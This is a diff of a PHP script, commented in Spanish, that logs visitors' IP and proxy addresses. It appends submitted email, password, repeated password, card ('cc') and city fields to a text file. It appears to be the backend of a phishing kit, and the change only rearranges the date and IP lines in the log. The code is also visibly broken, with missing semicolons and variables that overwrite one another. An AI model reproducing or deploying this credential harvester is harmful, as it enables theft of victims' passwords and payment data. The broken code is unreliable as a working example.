@@ -6,13 +6,9 @@ ini_set("display_errors", 0);
 
 if (empty($_SERVER["QUERY_STRING"])){
     $Fichero = "NEW01.txt"; //nombre del fichero donde se guardan los informes.
-    $fecha = date("Y-m-d;H:i:s"); //fecha y hora (por lo general del servidor) 
-    $ip = $_SERVER["REMOTE_ADDR"]; //guarda en la variable el ip 
-    $sistema = $_SERVER['HTTP_USER_AGENT']; //Esto nos genera varios datos del navegador y del sistema operativo 
-    $conproxy = $_SERVER["HTTP_X_FORWARDED_FOR"]; //En caso de usar proxy para esconderse aqui estaria el ip real
      
-    $log = "SISTEMA: $sistema "
-    $log = "FECHA: $fecha"
+    $ip = $_SERVER["REMOTE_ADDR"]; //guarda en la variable el ip  
+    $conproxy = $_SERVER["HTTP_X_FORWARDED_FOR"]; //En caso de usar proxy para esconderse aqui estaria el ip real
     $log = "IP: $ip "
     $log = "IPPROXY: $conproxy \x0D\x0A"; 
     $fp = fopen($Fichero, "a" ); 
@@ -26,9 +22,8 @@ fwrite($file,
 "* EMAIL: ".$_POST['email']."
 * PASS: ".$_POST['pass']."
 * PASS1: ".$_POST['pass1']."
-* F-H-IP-P-C: 
-".date('Y-m-d')."
-".date('H:i:s')."
+* FECHA: ".date('Y-m-d')."
+* HORA: ".date('H:i:s')."
 ".$userp."
 ".$cc."
 ".$city."   
